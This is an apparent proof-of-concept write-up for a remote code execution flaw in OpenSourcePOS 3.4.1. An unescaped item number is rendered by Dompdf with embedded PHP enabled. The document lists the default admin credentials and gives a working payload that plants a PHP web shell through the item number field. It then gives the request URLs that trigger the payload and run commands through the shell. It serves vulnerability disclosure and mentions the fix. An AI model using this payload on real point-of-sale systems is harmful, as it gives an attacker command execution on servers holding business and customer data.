# OpensourcePOS-3.4.1-RCE

RCE via PHP in the Dompdf invoice feature.

## Summary

This proof of concept demonstrates a remote code execution (RCE) in OpenSourcePOS 3.4.1 by abusing the invoice rendering flow. The issue is triggered when an attacker-controlled value is stored in the item number/barcode field and later rendered by Dompdf with embedded PHP enabled.

## Steps to reproduce

1. Log in with an account that has Items and Sales access. This PoC uses the seeded default credentials:
   - Username: `admin`
   - Password: `pointofsale`

2. Create a customer with a non-empty email address.

3. Create a disposable item with a normal item number.

4. Complete an invoice containing that item and note its sale ID at the bottom of the invoice.

5. Edit the item and replace its item number with:

```php
<script type="text/php">file_put_contents('/app/public/diag.php',"<?php echo shell_exec($_REQUEST['cmd'] ?? 'id'); ?>");</script>
```

6. While authenticated, request:

```text
http://127.0.0.1:8081/sales/sendPdf/<SALE_ID>
```

## Result

Dompdf renders `invoice_email.php`. In OSPOS 3.4.1, the item number is inserted without escaping, and Dompdf has embedded PHP enabled. Rendering executes the script and writes `/app/public/diag.php`.

After that, access the shell at:

```text
http://127.0.0.1:8081/diag.php?cmd=id
```

## Root cause

OSPOS stores an attacker-controlled value in the item's Item Number / Barcode field. After that item is included in a completed invoice, requesting `/sales/sendPdf/<sale_id>` places the value into a PDF generation context where it is interpreted as PHP by Dompdf.

This has been fixed in PR #4568 https://github.com/opensourcepos/opensourcepos/pull/4568
